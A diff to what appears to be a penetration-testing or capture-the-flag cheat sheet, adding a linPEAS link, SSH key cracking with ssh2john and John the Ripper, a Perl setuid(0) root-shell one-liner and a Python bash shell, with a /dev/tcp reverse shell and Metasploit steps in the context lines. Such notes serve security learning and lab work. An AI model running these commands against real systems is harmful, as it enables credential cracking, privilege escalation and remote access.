@@ -2,6 +2,7 @@
 
 ### Native tools
 - [Lin Enum](https://github.com/rebootuser/LinEnum)
+- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 - [RustScan](https://github.com/RustScan/RustScan)
 - [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
 
@@ -73,6 +74,20 @@ Client
 bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
 ```
 
+### John
+
+```
+/usr/share/john/ssh2john.py id_rsa > id_rsa_hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
+```
+
+### Perl escalation
+
+```
+perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+
 
 ### Metasploit basic usage
 ```shell
@@ -83,6 +98,12 @@ show options
 set rhosts <ip>
 set targeturi /cgi-bin/hello.cgi
 run
+```
+
+### Basic Python shell
+```
+import os
+os.system("/bin/bash")
 ```
 
 ### Basic banner grabbing (Python)
